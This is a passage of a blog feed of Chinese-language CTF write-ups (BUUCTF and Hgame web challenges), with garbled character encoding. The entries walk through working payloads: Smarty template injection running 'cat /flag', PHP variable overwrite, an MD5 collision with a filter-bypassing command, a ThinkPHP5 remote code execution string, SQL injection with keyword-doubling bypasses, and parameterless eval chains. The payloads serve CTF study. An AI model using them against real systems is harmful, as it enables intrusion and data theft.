    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[BJDCTF2020]The mystery of ip<img src="https://ftp.bmp.ovh/imgs/2021/02/feab62e0498a143e.png">     </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>flagé¡µé¢æŠ“åŒ…<br>æç¤ºçš„IP<br>åŠ ä¸ª<code>X-Forwarded-For</code><br>å…ˆè¯•äº†è¯•<code>127.0.0.1</code>â€”â€”â€“&gt;è¿”å›<code>127.0.0.1</code><br>åˆè¯•äº†è¯•<code>127</code>â€”â€”â€”&gt;è¿”å›<code>127</code><br>æ¨¡æ¿æ³¨å…¥ï¼Ÿï¼Ÿï¼Ÿ<br><code>&#123;&#123;7*7&#125;&#125;</code>â€”â€”â€”-&gt;<code>49</code><br>æ˜¯æ¨¡æ¿æ³¨å…¥äº†<br>ä½†ä¸æ˜¯pythonäº†ï¼Œæ˜¯PHPçš„smartyæ¨¡æ¿<br>{if}{/if}æ ‡ç­¾       </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payloadï¼š<code>&#123;if system(&#39;cat /flag&#39;)&#125;&#123;/if&#125;</code>       </p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul><li>{if}æ ‡ç­¾        <blockquote><p>Smartyçš„<code>&#123;if&#125;</code>æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª<code>&#123;if&#125;</code>å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„<code>&#123;/if&#125;</code>ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>&#123;else&#125;</code> å’Œ <code>&#123;elseif&#125;</code>ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚<code>||*, or, &amp;&amp;,</code> and, <code>is_array()</code>, ç­‰ç­‰ï¼Œå¦‚ï¼š<code>&#123;if is_array($array)&#125;&#123;/if&#125;</code></p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜035</title>
    <link href="/2021/02/23/BUU035/"/>
    <url>/2021/02/23/BUU035/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[BJDCTF2020]Mark loves cat<br><img src="https://ftp.bmp.ovh/imgs/2021/02/7c08fb9e1218a7c9.png"></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ä¸€ä¸ªçœ‹ä¸Šå»å¾ˆæ­£å¸¸çš„ç½‘é¡µï¼Œæ²¡å‘ç°ä»€ä¹ˆç‚¹â€”â€“æ‰«ç›®å½•å§<br>çœ‹åˆ°<code>.git</code>æ³„éœ²<br>githack<br>ä¸‹æ¥çš„åªæœ‰ä¸€ä¸ª<code>assets</code>æ–‡ä»¶å¤¹ï¼Œçœ‹åˆ«äººçš„WPæ˜¯æœ‰<code>index.php</code>çš„ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;$yds = <span class="hljs-string">&quot;dog&quot;</span>;$is = <span class="hljs-string">&quot;cat&quot;</span>;$handsome = <span class="hljs-string">&#x27;yds&#x27;</span>;<span class="hljs-keyword">foreach</span>($_POST <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;    $$x = $y;&#125;<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;    $$x = $$y;&#125;<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;    <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;        <span class="hljs-keyword">exit</span>($handsome);    &#125;&#125;<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;    <span class="hljs-keyword">exit</span>($yds);&#125;<span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || $_GET[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;    <span class="hljs-keyword">exit</span>($is);&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;the flag is: &quot;</span>.$flag;</code></pre></code></pre><p>å˜é‡è¦†ç›–<br>GETå’ŒPOST flagæ‰ä¼šæ‰§è¡Œæœ€åçš„è¾“å‡ºï¼Œå¯æ˜¯è¿™æ ·å°±å§<code>$flag</code>ç»™è¦†ç›–äº†  </p><p>å¯ä»¥å°†<code>$yds</code>è¦†ç›–æˆ<code>$flag</code>å€ŸåŠ©<code>$$x = $$y;</code>       </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payload1ï¼šGET  <code>?yds=flag</code>       </p><p>payload2:GET   <code>?is=flag&amp;flag=flag</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜034</title>
    <link href="/2021/02/22/BUU034/"/>
    <url>/2021/02/22/BUU034/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[å®‰æ´µæ¯ 2019]easy_web<img src="https://ae03.alicdn.com/kf/U37981b99273b48eda811753994099f30i.jpg" alt="01.png">    </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ç…§ä¾‹æŸ¥çœ‹æºä»£ç <br>å‘ç°ä¸ªå›¾ç‰‡base64ï¼Œè§£ç åå°±æ˜¯å·¦ä¸Šè§’é‚£ä¸ªå›¾<br>urlä¸­æœ‰ä¸€æ®µå¯ç–‘å­—ç¬¦ä¸²<code>TXpVek5UTTFNbVUzTURabE5qYz0</code>åº”è¯¥æ˜¯base64å§ï¼Œå°è¯•è§£ç ï¼Œä½†è§£ä¸å‡ºæ¥ï¼Œåˆ«çš„ç¼–ç ï¼Ÿçœ‹wpåå°±æ˜¯base64å•Šï¼Ÿï¼Ÿâ€”â€“åŠ ä¸ªç­‰å·â€”è§£å‡ºæ¥äº†<br>è¿˜æ˜¯base64ï¼Œå†è§£ï¼Œç„¶åæ˜¯<code>hex</code>è§£ç â€”â€”å¾—åˆ°<code>555.png</code>é‚£ä¸ªå›¾ç‰‡çš„åå­—<br>è¿™æ ·çš„è¯å°±å¯ä»¥ç”¨æ­¤æ–¹æ³•è¯»å–æ–‡ä»¶äº†<br>è¯»å–<code>index.php</code>  </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(E_ALL || ~ E_NOTICE);header(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);$cmd = $_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>];<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]))     header(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">&#x27;img&#x27;</span>])));$file = preg_replace(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, $file);<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, $file)) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixiï½ no flag&quot;</span>);&#125; <span class="hljs-keyword">else</span> &#123;    $txt = base64_encode(file_get_contents($file));    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;<span class="hljs-keyword">echo</span> $cmd;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;        <span class="hljs-keyword">echo</span> `$cmd`;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre>```html&lt;html&gt;&lt;style&gt;  body&#123;   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;     ```       </code></pre><p>ä¸€ä¸ªMD5çš„å¼ºæ¯”è¾ƒ       </p><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2      </code></pre><p>è¿‡æ»¤äº†ä¸€äº›å‘½ä»¤å’Œç¬¦å·       </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payloadï¼š<code>dir /</code><img src="https://sc02.alicdn.com/kf/Uf896e48951dd4e559b0696b426dbe15d3.jpg" alt="02.png"><br>å‘ç°flag<br>è¯»å–ï¼š<code>ca\t /f\lag</code><img src="https://ae03.alicdn.com/kf/U73764e1722564e7083cc37a1d9f04b3cE.jpg" alt="03.png"><br><strong>ä½†æ˜¯</strong><br><code>|\\|\\\\|</code><br><code>\</code>ä¸æ˜¯è¢«è¿‡äº†ä¹ˆï¼Ÿ<br>ä¸€ä¸ªå¤§ä½¬çš„è§£é‡Šï¼šè¿™ä¸ªæ­£åˆ™æ˜¯æ”¾åœ¨PHPé‡Œçš„ï¼Œè¦ç»è¿‡ä¸¤å±‚è§£æå™¨<br>PHP:ç¬¬ä¸€ä¸ª<code>\</code>è½¬ä¹‰äº†ç¬¬äºŒä¸ªï¼›ç¬¬ä¸‰ä¸ªè½¬ä¹‰ç¬¬å››ä¸ªï¼›ç¬¬äº”ä¸ªè½¬ä¹‰ç¬¬å…­ä¸ªâ€”â€”&gt;<code>|\|\\|</code><br>æ­£åˆ™ï¼šè½¬ä¹‰æˆä¸Šé¢é‚£æ ·ï¼Œé‚£åŒ¹é…çš„å°±æ˜¯<code>|\</code>äº†ï¼Œè€Œä¸ä»…ä»…æ˜¯<code>\</code><br><a href="https://www.jianshu.com/p/076c5b422c96">MORE</a>    </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜033</title>
    <link href="/2021/02/21/BUU033/"/>
    <url>/2021/02/21/BUU033/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[BJDCTF 2nd]old-hack<br><img src="https://sc02.alicdn.com/kf/U3c7ce5b5640949679951f516bed1b102h.jpg" alt="01.png">    </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>çœ‹åˆ°<code>THINKPHP5</code>æƒ³åˆ°ä¹‹å‰åœ¨æ”»é˜²ä¸–ç•Œä¸Šçš„ä¸€é“THINKPHPçš„æ¼æ´<br><code>? s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=xxxxxï¼ˆå‘½ä»¤ï¼‰</code><br>ä½†è¿™é‡Œå¥½åƒä¸æ˜¯<br>çœ‹wp      </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payloadï¼š<code>_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code><br>POST<br><img src="https://ae02.alicdn.com/kf/Uea8483337ea24698bf907efa1111af7bw.jpg" alt="02.png"><br>æˆåŠŸæ‰§è¡Œ<br>ç„¶åæ‰¾flagå³å¯      </p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p><a href="https://xz.aliyun.com/t/3845">çŸ¥è¯†ç‚¹</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgameweek2</title>
    <link href="/2021/02/17/hgameweek2/"/>
    <url>/2021/02/17/hgameweek2/</url>
    
    <content type="html"><![CDATA[<h2 id="LazyDogR4U"><a href="#LazyDogR4U" class="headerlink" title="LazyDogR4U"></a>LazyDogR4U</h2><p><img src="https://sc04.alicdn.com/kf/H8e78f14012ee46188cad7f4cfdbcb8bev.jpg" alt="01.png"></p><p>dirsearchæ‰«å‡º<code>www.zip</code><br>ä¸»è¦çš„ï¼š<br><code>flag.php</code>:         </p><pre><code>&lt;?phpsession_start();require_once &#39;lazy.php&#39;;if(!isset($_SESSION[&#39;username&#39;]))&#123;    die(&#39;æ‚¨é…å—ï¼Ÿ&#39;);&#125;?&gt;  &lt;?php    if($_SESSION[&#39;username&#39;] === &#39;admin&#39;)&#123;        echo &quot;&lt;h3 style=&#39;color: white&#39;&gt;adminå°†äºä»Šæ—¥è·å–è‡ªå·±å¿ å®çš„flag&lt;/h3&gt;&quot;;        echo &quot;&lt;h3 style=&#39;color: white&#39;&gt;$flag&lt;/h3&gt;&quot;;    &#125;else&#123;        if($submit == &quot;getflag&quot;)&#123;            echo &quot;&lt;h3 style=&#39;color: white&#39;&gt;&#123;$_SESSION[&#39;username&#39;]&#125;æ¥è¿‘äº†é—®é¢˜çš„ç»ˆç‚¹&lt;/h3&gt;&quot;;        &#125;else&#123;            echo &quot;&lt;h3 style=&#39;color: white&#39;&gt;ç¯¡ä½è€…å é¢†äº†ç¥åœ£çš„é¡µé¢&lt;/h3&gt;&quot;;        &#125;    &#125;        ?&gt;    </code></pre><p>è¦æƒ³å¾—åˆ°flagï¼Œusername===admin<br><code>flag.php</code>åŒ…å«äº†<code>lazy.php</code>         </p><p><code>lazy.php</code>:      </p><pre><code>&lt;?php$filter = [&quot;SESSION&quot;, &quot;SEVER&quot;, &quot;COOKIE&quot;, &quot;GLOBALS&quot;];// ç›´æ¥æ³¨å†Œæ‰€æœ‰å˜é‡ï¼Œè¿™æ ·æˆ‘å°±èƒ½å°‘æ‰“å­—åŠ›ï¼ŒèŠœæ¹–~foreach(array(&#39;_GET&#39;,&#39;_POST&#39;) as $_request)&#123;    foreach ($$_request as $_k =&gt; $_v)&#123;        foreach ($filter as $youBadBad)&#123;            $_k = str_replace($youBadBad, &#39;&#39;, $_k);        &#125;        $&#123;$_k&#125; = $_v;    &#125;&#125;         </code></pre><p>ç¬¬ä¸€ä¸ªå¾ªç¯ï¼Œå°†GETå’ŒPOSTå¾—åˆ°çš„æ•°æ®ç»™<code>$_request</code><br>ç¬¬äºŒä¸ªå¾ªç¯ï¼Œå°†é”®å€¼åˆ†åˆ«èµ‹ç»™<code>$_k</code>å’Œ<code>$_v</code><br>ç¬¬ä¸‰ä¸ªå¾ªç¯ï¼Œè¿‡æ»¤<code>$filter</code>ä¸­çš„è¯<br>ä¼ å…¥<code>username=admin</code><br>ç»è¿‡<code>$&#123;$_k&#125; = $_v</code>,å°±æˆäº†<code>$username=admin</code><br>ç»™çš„wpä¸­æ˜¯<code>_SESSISESSIONON[username]=admin</code><br>ç»è¿‡<code>lazy.php</code>åæ˜¯<code>$_SESSION=$_v</code>è€Œ<code>$_v</code>æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œ<code>array(1) &#123; [&quot;username&quot;]=&gt; string(5) &quot;admin&quot; &#125;</code><br>æ‰€ä»¥<code>$_SESSION[username]=admin</code>è¾¾åˆ°å˜é‡è¦†ç›–            </p><p>è‡³äºwpä¸­æ‰€è¯´çš„ï¼Œé”®ä¸èƒ½å¸¦å¼•å·ï¼š   </p><pre><code>&lt;?php$A=[&quot;&#39;lisi&#39;&quot;=&gt;15,&quot;zhangsan&quot;=&gt;11];var_dump($A[&#39;lisi&#39;]);?&gt;  </code></pre><p>è¿™æ ·ä¸€ä¸²ä»£ç ï¼Œè¾“å‡ºçš„æ˜¯<code>NULL</code>,è€Œ<code>var_dump(zhangsan)</code>æ˜¯å¯ä»¥æ­£å¸¸è¾“å‡ºçš„        </p><p><a href="https://www.cnblogs.com/xiaozi/p/7768580.html">å˜é‡è¦†ç›–</a>     </p><h2 id="200OK"><a href="#200OK" class="headerlink" title="200OK!!"></a>200OK!!</h2><p><img src="https://sc04.alicdn.com/kf/H5e86506d64a6482dbf4a1e7e31d70405r.jpg" alt="02.png"><br>ç‚¹å‡»<code>Reload</code>å¯ä»¥åœ¨å¼€å‘å·¥å…·çš„ç½‘ç»œä¸­å‘ç°ä¸€ä¸ª<code>server.php</code><br>æŠ“åŒ…<br>åœ¨jsä¸­å‘ç°é¡µé¢çš„ä¸åŒæ˜¾ç¤ºæ˜¯statusä¸åŒçš„æ•°å­—<br>åœ¨è¯·æ±‚å¤´ä¸­åŠ å…¥statusï¼Œä½¿å…¶ç­‰äºä¸åŒæ•°å€¼ï¼Œå³å¯å›æ˜¾ä¸åŒä¿¡æ¯<br><code>status:  1&#39;</code>æ²¡æœ‰å›æ˜¾ï¼ŒåŠ ä¸Š<code>#</code>æ­£å¸¸<br>å­˜åœ¨SQLæ³¨å…¥â€”â€“å•å¼•å·<br>æœ‰è¿‡æ»¤<code> [&#39;select&#39;, &#39;SELECT&#39;, &#39;from&#39;, &#39;FROM&#39;, &#39;union&#39;, &#39;UNION&#39;, &#39;where&#39;, &#39;WHERE&#39;, &#39; &#39;]</code><br>å¯ä»¥ç”¨å¼‚æˆ–æ£€éªŒï¼š   </p><pre><code>1^1=00^0=01^0=10---------&gt;HTTP 200 OK       1---------&gt;NETWORK ERROR        </code></pre><p><code>1^if(length(&#39;select&#39;)&gt;1,1,0)#</code>è¿”å›çš„æ˜¯NETWORK ERROR<br>åŒå†™å¯ä»¥ç»•è¿‡ï¼Œæˆ–è€…æ”¹å­—æ¯å¤§å°å†™ï¼›ç©ºæ ¼ç”¨<code>/**/</code>ä»£æ›¿ï¼Œæˆ–è€…æ‹¬å·å°†è¯­å¥æ‹¬èµ·æ¥<br><code>-1&#39;/**/ununionion/**/selselectect/**/database()#</code>åº“åâ€”â€“&gt;week2sqli<br><code>-1&#39;/**/ununionion/**/selselectect/**/group_concat(table_name)/**/frOm/**/information_schema.tables/**/wHere/**/table_schema=&#39;week2sqli&#39;#</code>è¡¨åâ€”â€”â€”â€“&gt;<code>f1111111144444444444g</code>,<code>status</code><br><code>-1&#39;/**/ununionion/**/selselectect/**/group_concat(column_name)/**/frOm/**/information_schema.columns/**/wHere/**/table_name=&#39;f1111111144444444444g&#39;#</code>åˆ—â€”â€”â€“&gt;<code>ffffff14gggggg</code><br><code>-1&#39;/**/ununionion/**/selselectect/**/group_concat(ffffff14gggggg)/**/frOm/**/f1111111144444444444g#</code>å­—æ®µâ€”â€”â€”-&gt;<code>hgame&#123;Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!=)&#125;</code>        </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜032</title>
    <link href="/2021/02/15/BUU032/"/>
    <url>/2021/02/15/BUU032/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸‰åäºŒã€"><a href="#ä¸‰åäºŒã€" class="headerlink" title="ä¸‰åäºŒã€"></a>ä¸‰åäºŒã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ<img src="https://ae02.alicdn.com/kf/Hbb3da855d0da4bca8aaa3e2113c5f09bo.jpg" alt="01.png">    </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æºç ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œ<code>robots.txtã€www.zipã€index.phps</code>éƒ½æ²¡æœ‰ï¼Œç„¶åæ‰«ç›®å½•ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆ<br>çœ‹WPå§<br><code>/.git</code>æ³„éœ²ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ<br>ä¸ºä»€ä¹ˆæˆ‘æ‰«ä¸å‡ºæ¥ï¼Œè€Œä¸”<code>GitHack</code>åä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ<br>â€¦â€¦â€¦â€¦â€¦â€¦â€¦..<br>æ³„éœ²çš„æºç ï¼š        </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;            <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span>                @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]);            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);            &#125;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);        &#125;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);    &#125;&#125;<span class="hljs-comment">// highlight_file(__FILE__);</span><span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>ç¬¬ä¸€ä¸ªif,è¿‡æ»¤äº†ä¼ªåè®®<br>ç¬¬äºŒä¸ªifï¼Œè¦æ±‚ä¸èƒ½æœ‰å‚æ•°ï¼Œ<code>(?R)</code>è¡¨ç¤ºå¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œå¤šä¸€ä¸ª<code>?</code>è¡¨ç¤ºå¯ä»¥å¼•ç”¨ï¼Œä¹Ÿå¯ä»¥ä¸å¼•ç”¨ï¼›è¿™é‡Œä¹Ÿå°±æ˜¯å¯ä»¥é…<code>a()ã€ab(a())....</code>  <img src="https://sc01.alicdn.com/kf/H818b4a1c2aca431a8c533aac17b5aae1P.jpg" alt="04.png"><br>ç¬¬ä¸‰ä¸ªifï¼ŒåŒ¹é…ä¸€äº›å­—ç¬¦<br>$expä¸­ä¸èƒ½å«å‚<br>é¦–å…ˆæ‰«æç›®å½•ä¸­çš„æ–‡ä»¶<br><code>scandir(&#39;.&#39;)</code> ï¼Œéœ€è¦æ„é€ ä¸ªç‚¹å„¿<br><code>localeconv()</code>å‡½æ•°ä¼šè¿”å›åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œæ•°ç»„çš„ç¬¬ä¸€é¡¹å°±æ˜¯ç‚¹ï¼›<code>current()</code>å‡½æ•°è¿”å›æ•°ç»„å½“å‰å•å…ƒï¼Œé»˜è®¤ä¸ºç¬¬ä¸€é¡¹<br>payloadï¼š<code>print_r(scandir(current(localeconv())));</code><br><img src="https://ae03.alicdn.com/kf/Hd1cc742391d04c5cb7bcc3d02f1762521.jpg" alt="02.png"><br>æ¥ä¸‹æ¥è¯»å–<code>flag.php</code><br>etè¢«è¿‡äº†ï¼Œå¯ä»¥ç”¨<code>highlight_file</code><br><code>next()</code>å‡½æ•°å¯ä»¥è¯»å–æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ª,ä½†nextä¸èƒ½å¥—next<br><code>array_resverse()</code>å¯ä»¥ç°å°†æ•°ç»„åè½¬<br>ç„¶åè¯»å–ç¬¬äºŒä¸ª            </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>payloadï¼š<code>?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code><img src="https://sc01.alicdn.com/kf/H2d0db781d3f84faaa4dea78920f250dda.jpg" alt="03.png">    </p><hr><p>è§£æ³•äºŒ<br><code>arry_flip()</code>å‡½æ•°ï¼Œäº¤æ¢æ•°ç»„çš„é”®å’Œå€¼<br><code>arry_rand()</code>å‡½æ•°ï¼Œä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ<br>payloadï¼š<code>?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code><br>è§£æ³•ä¸‰<br>ä½¿ç”¨session<br><code>session_start()</code>å¼€å¯<br><code>session_id()</code>è·å–å½“å‰çš„session id<br>éœ€è¦æ‰‹åŠ¨è®¾ç½®<code>Cookie: PHPSESSID=flag.php</code><br><img src="https://ae02.alicdn.com/kf/Hf6e429eef7934a1b919a3e129bed795ec.jpg" alt="05.png">        </p><p>###çŸ¥è¯†ç‚¹<br><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">æ— å‚æ•°RCE</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜031</title>
    <link href="/2021/02/14/BUU031/"/>
